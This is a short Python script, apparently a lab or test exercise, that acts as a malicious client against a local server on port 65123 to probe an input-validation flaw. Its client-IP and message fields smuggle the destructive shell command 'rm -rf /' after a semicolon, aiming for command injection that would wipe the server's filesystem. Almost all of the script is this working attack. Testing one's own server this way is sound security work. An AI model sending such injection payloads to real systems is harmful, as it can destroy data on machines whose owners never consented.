"""
By executing this Python code,  I want to emulating a client that sends the malicious payload to the server
attempting to exploit the input validation vulnerability
"""

import socket
# Connect to the server
server_address = ('localhost', 65123)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(server_address)

# Craft a malicious client IP and message
# Modifying the inputs to "127.0.0.1; rm -rf /"
# Establishing a connection with the server using a socket. 
# Then, I craft a payload by combining the malicious client IP (127.0.0.1; rm -rf /) and message (S; rm -rf /).
# I send the payload to the server and receive the server's response.
#
client_ip = '127.0.0.1; rm -rf /' 
message = 'S; rm -rf /'
message2 = '127.0.0.1'
 

# Craft the payload by combining client IP and message
payload = f'{client_ip}\n{message}\n{message2}'

# Send the payload to the server
client_socket.sendall(payload.encode())

# Receive and print the server's response
response = client_socket.recv(1024).decode()
print(response)

# Close the connection
client_socket.close()


